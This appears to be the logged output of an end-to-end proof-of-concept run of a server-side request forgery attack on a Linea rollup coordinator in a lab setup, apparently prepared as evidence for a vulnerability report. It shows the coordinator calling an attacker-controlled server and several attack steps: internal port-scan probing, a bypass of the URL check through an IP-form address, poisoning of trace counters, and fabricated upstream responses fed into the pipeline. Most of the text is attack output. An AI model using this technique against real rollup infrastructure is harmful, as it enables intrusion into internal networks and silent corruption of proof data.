@@ -1,0 +1,702 @@
+######################################################################
+# LINEA COORDINATOR SSRF - END-TO-END IMPACT PoC
+# started: 2026-09-06T16:49:18Z
+######################################################################
+
+=== [0] HARNESS SETUP ===============================================
+[+] Coordinator RPC  : http://10.10.10.106:9546/   <- the only attacker-side knowledge
+[+] Attacker server  : http://10.10.10.1:12345 (simulates attacker-hosted OOB/MITM)
+[+] Real traces node : http://10.10.10.5:8545 (harness-discovered; a real attacker maps this via the scan oracle)
+[+] Block range      : 717..718 (attacker finds a valid range via submit-error probing)
+[+] attacker server up (pid 1168910) - modes: / (recon), /fab, /tap, /tapover
+
+=== [1] BEFORE ATTACK - normal operation (defender view) ============
+natural batches (3 min) : 20
+  time=2026-09-06T16:49:17,994Z level=INFO message=new batch: batch=[719..719]1 trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEX
+  time=2026-09-06T16:49:26,995Z level=INFO message=new batch: batch=[720..720]1 trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEX
+retry-loop lines        : 5559
+forged log lines        : 3
+config-dump lines       : 20
+backtesting job dirs    : 20
+OOB calls received      : 7
+
+=== [2] ATTACK (attacker view - RPC-only, no docker access) =========
+--- [A1] Blind SSRF confirmation + protocol capture -----------------
+job accepted: {"jsonrpc":"2.0","id":1,"result":["717-718-793344921"]}
+waiting 40s for the coordinator to make its outbound call...
+calls captured on the attacker server:
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_getBlockTracesCountersV2           recon mode: request captured, invalid reply returned
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_getBlockTracesCountersV2           recon mode: request captured, invalid reply returned
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_getBlockTracesCountersV2           recon mode: request captured, invalid reply returned
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+>> impact: server-side POST from the coordinator's internal network
+   position to an attacker-controlled URL (blind SSRF confirmed).
+>> the request body itself discloses the internal protocol.
+
+--- [A2] Internal reachability oracle (port scan primitive) ---------
+blackhole job (717-718--1549136829) submitted to a closed port; polling status...
+  t=10s: {"jsonrpc":"2.0","id":1,"result":["IN_PROGRESS"]}
+  t=20s: {"jsonrpc":"2.0","id":1,"result":["IN_PROGRESS"]}
+  t=30s: {"jsonrpc":"2.0","id":1,"result":["IN_PROGRESS"]}
+>> attacker-visible differential: a job against an unreachable target
+   stays IN_PROGRESS forever (infinite retry). Against the attacker's
+   own server the OOB log fills within seconds. Combined with public
+   compose hostnames, this is a blind internal network mapping oracle.
+
+--- [A3] The only URL control: live-endpoint overlap check + bypass -
+tracesApi = PUBLIC live endpoint string (http://l2-node-besu:8545/):
+  -> {"jsonrpc":"2.0","id":3,"error":{"code":-32603,"message":"Internal error"}}
+tracesApi = same node via IP form (http://10.10.10.5:8545):
+  -> {"jsonrpc":"2.0","id":4,"result":["717-718--1592333779"]}
+>> the overlap check (documented) is string-equality based: the IP form
+   of the very same internal service is accepted. Whichever response
+   pair appears above is the empirical evidence for the report.
+
+--- [A4] Data poisoning: silent corruption (counters +1000) ---------
+poison-plus job: {"jsonrpc":"2.0","id":5,"result":["717-718-744610481"]}
+waiting up to 120s (status polls; harness may peek logs for early exit)...
+  poisoned batch detected at t=10s
+
+--- [A5] Data poisoning: decision control (counters = 999999999) ----
+poison-over job: {"jsonrpc":"2.0","id":6,"result":["717-718-700722953"]}
+  forced-limit batch detected at t=10s
+
+--- [A6] Black-box full pipeline ride (fabricated upstreams) --------
+fabricated-mode job: {"jsonrpc":"2.0","id":7,"result":["717-718-342967785"]} (attacker supplies EVERYTHING)
+waiting 90s to ride the pipeline as far as it goes...
+call sequence the coordinator made TO THE ATTACKER:
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_getBlockTracesCountersV2           FABRICATED counters (schema from public repo)
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_getBlockTracesCountersV2           FABRICATED counters (schema from public repo)
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_getBlockTracesCountersV2           FABRICATED counters (schema from public repo)
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
